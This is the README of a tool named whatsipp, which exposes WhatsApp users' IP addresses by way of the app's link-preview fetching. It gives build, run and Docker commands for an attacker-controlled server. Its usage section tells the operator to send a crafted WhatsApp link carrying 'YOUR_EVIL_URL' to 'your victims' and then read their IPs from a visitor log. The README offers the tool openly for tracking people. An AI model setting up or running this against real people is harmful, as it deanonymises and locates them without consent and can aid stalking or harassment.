### WhatsApp user’s IP disclosure with Link Preview

#### Synopsis

As you know modern messengers have many features besides their main function — texting.
They are able to play/record music/videos, send photos, send geolocation and so on.

So they are also capable to generate link previews.
Best practice is to generate preview by external proxy server which will fetch content for you. 

However WhatsApp developers decided to rely on internal web engine that comes with OS.

It's not needed to explain that now WhatsApp will leak your IP address on every received link.  

**NOTE: You will need VPS with static IP and domain.**

#### Setup - Classic way

1. Get the repo by `go get` or `git clone` this repo:
`$ go get https://github.com/moldabekov/whatsipp`
`$ git clone https://github.com/moldabekov/whatsipp`

2. Build binary:
`$ make build`

3. Run it:
`$ sudo W_LEAK_PORT=80 ./main`

#### Setup - Docker

1. `docker pull unstab1e/whatsipp`
2. `docker run --rm -it -p 80:8080 unstab1e/whatsipp`

#### Setup - Docker from scratch

1. Get the repo by `go get` or `git clone` this repo:
`$ go get https://github.com/moldabekov/whatsipp`
`$ git clone https://github.com/moldabekov/whatsipp`

2. Run container:
`$ make docker`

#### Usage

* Open WhatApp client and type your URL (*e.g. https://domain.com/leak*)

* Or send this link to your victims: https://api.whatsapp.com/send?phone=+7**PHONE_NUMBER**&text=http%3A%2F%2F**YOUR_EVIL_URL**

* In separate tab watch IP leaks:
`$ tail -f visitors.log`

#### Credits
Greets goes to *Rahul Kankrale* for figuring out.

#### License
(C) MIT License
